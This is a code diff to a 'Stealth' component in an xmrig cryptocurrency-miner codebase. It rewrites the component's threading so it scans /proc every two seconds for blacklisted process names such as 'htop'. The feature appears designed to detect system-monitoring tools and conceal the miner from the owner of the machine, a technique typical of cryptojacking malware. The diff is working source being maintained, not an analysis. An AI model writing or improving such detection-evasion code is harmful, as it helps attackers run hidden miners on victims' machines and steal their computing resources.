@@ -9,7 +9,7 @@ namespace xmrig {
 
 Stealth::Stealth(Controller *controller) :
     m_controller(controller),
-    m_thread(new Thread<Stealth>("Stealth"))
+    m_running(false)
 {
     m_blacklist = {
         "htop",
@@ -25,22 +25,39 @@ Stealth::Stealth(Controller *controller) :
 Stealth::~Stealth()
 {
     stop();
-    delete m_thread;
 }
 
 void Stealth::start()
 {
-    m_thread->start([this]() {
-        while (m_thread->isContinue()) {
-            checkProcesses();
-            m_thread->sleep(2000);
-        }
-    }, false);
+    if (m_running) {
+        return;
+    }
+
+    m_running = true;
+    m_thread = new std::thread(&Stealth::mainLoop, this);
 }
 
 void Stealth::stop()
 {
-    m_thread->stop();
+    if (!m_running) {
+        return;
+    }
+
+    m_running = false;
+    if (m_thread && m_thread->joinable()) {
+        m_thread->join();
+    }
+
+    delete m_thread;
+    m_thread = nullptr;
+}
+
+void Stealth::mainLoop()
+{
+    while (m_running) {
+        checkProcesses();
+        std::this_thread::sleep_for(std::chrono::seconds(2));
+    }
 }
 
 void Stealth::checkProcesses()
@@ -54,7 +71,8 @@ void Stealth::checkProcesses()
     struct dirent *entry;
     while ((entry = readdir(dir)) != nullptr) {
         if (entry->d_type == DT_DIR) {
-            long pid = strtol(entry->d_name, &endptr, 10);
+            char *endptr;
+            strtol(entry->d_name, &endptr, 10);
             if (*endptr == '\0') {
                 std::string commPath = std::string("/proc/") + entry->d_name + "/comm";
                 std::ifstream commFile(commPath);
